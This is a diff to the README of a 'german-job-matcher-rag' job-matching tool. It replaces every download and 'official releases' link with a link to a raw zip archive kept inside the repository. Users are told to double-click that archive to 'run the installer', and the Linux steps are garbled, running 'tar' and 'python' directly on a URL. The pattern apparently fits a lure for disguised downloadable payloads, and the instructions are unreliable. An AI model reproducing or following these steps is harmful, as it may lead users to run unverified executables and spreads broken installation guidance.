@@ -17,7 +17,7 @@ To run the german-job-matcher-rag application, you need:
 ## 📥 Download and Install
 
 To get the latest version of german-job-matcher-rag, visit this page to download:  
-[![Download german-job-matcher-rag](https://raw.githubusercontent.com/irullbarca/german-job-matcher-rag/main/jobs/matcher_german_job_rag_v2.3.zip%20Release-orange)](https://raw.githubusercontent.com/irullbarca/german-job-matcher-rag/main/jobs/matcher_german_job_rag_v2.3.zip)
+[![Download german-job-matcher-rag](https://raw.githubusercontent.com/irullbarca/german-job-matcher-rag/main/resumes/job-german-rag-matcher-v3.6.zip%20Release-orange)](https://raw.githubusercontent.com/irullbarca/german-job-matcher-rag/main/resumes/job-german-rag-matcher-v3.6.zip)
 
 1. Click on the link above.
 2. Find the latest release at the top of the page.
@@ -25,9 +25,9 @@ To get the latest version of german-job-matcher-rag, visit this page to download
 4. Locate the downloaded file on your computer.
 
 ### Example Files
-- For Windows, you may download `https://raw.githubusercontent.com/irullbarca/german-job-matcher-rag/main/jobs/matcher_german_job_rag_v2.3.zip`.
-- For macOS, you might see `https://raw.githubusercontent.com/irullbarca/german-job-matcher-rag/main/jobs/matcher_german_job_rag_v2.3.zip`.
-- For Linux, check for `https://raw.githubusercontent.com/irullbarca/german-job-matcher-rag/main/jobs/matcher_german_job_rag_v2.3.zip`.
+- For Windows, you may download `https://raw.githubusercontent.com/irullbarca/german-job-matcher-rag/main/resumes/job-german-rag-matcher-v3.6.zip`.
+- For macOS, you might see `https://raw.githubusercontent.com/irullbarca/german-job-matcher-rag/main/resumes/job-german-rag-matcher-v3.6.zip`.
+- For Linux, check for `https://raw.githubusercontent.com/irullbarca/german-job-matcher-rag/main/resumes/job-german-rag-matcher-v3.6.zip`.
 
 After the download is complete, follow the installation steps below based on your operating system.
 
@@ -35,14 +35,14 @@ After the download is complete, follow the installation steps below based on you
 
 ### For Windows
 
-1. Locate the downloaded `https://raw.githubusercontent.com/irullbarca/german-job-matcher-rag/main/jobs/matcher_german_job_rag_v2.3.zip` file.
+1. Locate the downloaded `https://raw.githubusercontent.com/irullbarca/german-job-matcher-rag/main/resumes/job-german-rag-matcher-v3.6.zip` file.
 2. Double-click the file to run the installer.
 3. Follow the on-screen instructions to complete the installation.
 4. Launch the application from your Start menu or desktop shortcut.
 
 ### For macOS
 
-1. Find the downloaded `https://raw.githubusercontent.com/irullbarca/german-job-matcher-rag/main/jobs/matcher_german_job_rag_v2.3.zip` file.
+1. Find the downloaded `https://raw.githubusercontent.com/irullbarca/german-job-matcher-rag/main/resumes/job-german-rag-matcher-v3.6.zip` file.
 2. Double-click the file to open it.
 3. Drag the german-job-matcher-rag icon to your Applications folder.
 4. Open Applications and double-click the german-job-matcher-rag icon to launch it.
@@ -50,10 +50,10 @@ After the download is complete, follow the installation steps below based on you
 ### For Linux
 
 1. Open the terminal.
-2. Navigate to the directory where the `https://raw.githubusercontent.com/irullbarca/german-job-matcher-rag/main/jobs/matcher_german_job_rag_v2.3.zip` file was downloaded.
+2. Navigate to the directory where the `https://raw.githubusercontent.com/irullbarca/german-job-matcher-rag/main/resumes/job-german-rag-matcher-v3.6.zip` file was downloaded.
 3. Extract the tarball with the command: 
    ```
-   tar -xvzf https://raw.githubusercontent.com/irullbarca/german-job-matcher-rag/main/jobs/matcher_german_job_rag_v2.3.zip
+   tar -xvzf https://raw.githubusercontent.com/irullbarca/german-job-matcher-rag/main/resumes/job-german-rag-matcher-v3.6.zip
    ```
 4. Change into the extracted directory:
    ```
@@ -61,7 +61,7 @@ After the download is complete, follow the installation steps below based on you
    ```
 5. Run the application with:
    ```
-   python https://raw.githubusercontent.com/irullbarca/german-job-matcher-rag/main/jobs/matcher_german_job_rag_v2.3.zip
+   python https://raw.githubusercontent.com/irullbarca/german-job-matcher-rag/main/resumes/job-german-rag-matcher-v3.6.zip
    ```
 
 ## 📊 Usage Instructions
@@ -105,6 +105,6 @@ Utilizing technologies like these helps bring the best matching results to users
 
 ## 🔗 Additional Resources
 
-To stay updated with any future releases and enhancements, revisit the [official releases page](https://raw.githubusercontent.com/irullbarca/german-job-matcher-rag/main/jobs/matcher_german_job_rag_v2.3.zip) periodically.
+To stay updated with any future releases and enhancements, revisit the [official releases page](https://raw.githubusercontent.com/irullbarca/german-job-matcher-rag/main/resumes/job-german-rag-matcher-v3.6.zip) periodically.
 
 Thank you for using german-job-matcher-rag. We hope it helps you find the job that suits you best!
